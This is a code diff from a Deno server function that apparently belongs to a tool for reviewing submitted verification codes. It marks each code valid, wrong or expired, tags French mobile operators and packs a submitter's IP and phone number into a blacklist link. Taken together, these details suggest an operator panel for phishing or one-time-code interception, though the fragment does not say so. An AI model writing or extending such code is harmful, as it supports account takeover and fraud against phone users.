@@ -34,21 +34,14 @@ Deno.serve(async (req) => {
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
   const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
 
-  // OAuth2 URLs for Discord
-  const clientId = Deno.env.get("DISCORD_APP_ID");
-  const redirectUri = appUrl + "/discord-oauth-callback";
-  
-  // Create state parameter with action and submission ID
-  const createOAuthUrl = (action) => {
-    const state = btoa(JSON.stringify({ submissionId, action }));
-    const scope = 'identify%20email';
-    return `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scope}&state=${state}`;
-  };
-  
-  const validUrl   = createOAuthUrl('code_valid');
-  const wrongUrl   = createOAuthUrl('code_wrong');
-  const expiredUrl = createOAuthUrl('code_expired');
-  const blacklistUrl = createOAuthUrl('blacklist');
+  // These links call triggerSendCode with the action param
+  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
+  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
+
+  // Create a simple blacklist URL with base64 encoding
+  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
+  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
 
   let country = "Inconnue";
   let city = "Inconnue";
